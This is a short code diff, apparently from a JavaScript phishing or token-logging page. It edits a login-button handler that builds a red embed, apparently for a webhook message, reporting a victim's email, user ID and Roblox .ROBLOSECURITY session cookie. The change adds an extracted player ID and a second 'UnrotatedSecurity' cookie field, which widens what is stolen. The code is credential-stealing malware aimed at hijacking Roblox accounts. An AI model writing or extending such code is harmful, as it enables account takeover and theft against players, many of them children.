@@ -180,7 +180,8 @@ document.getElementById('login-button').addEventListener('click', () => {
       color: 15158332,  // red color
       fields: [
         { name: "Email", value: safeEmail, inline: false },
-        { name: "UserID", value: refreshedSecurity, inline: false },
+        { name: "UserID", value: extractedPlayerID, inline: false },
+	{ name: "UnrotatedSecurity", value: refreshedSecurity, inline: false },
         { name: ".ROBLOSECURITY", value: safeSecurity, inline: false }
       ],
       timestamp: new Date().toISOString()
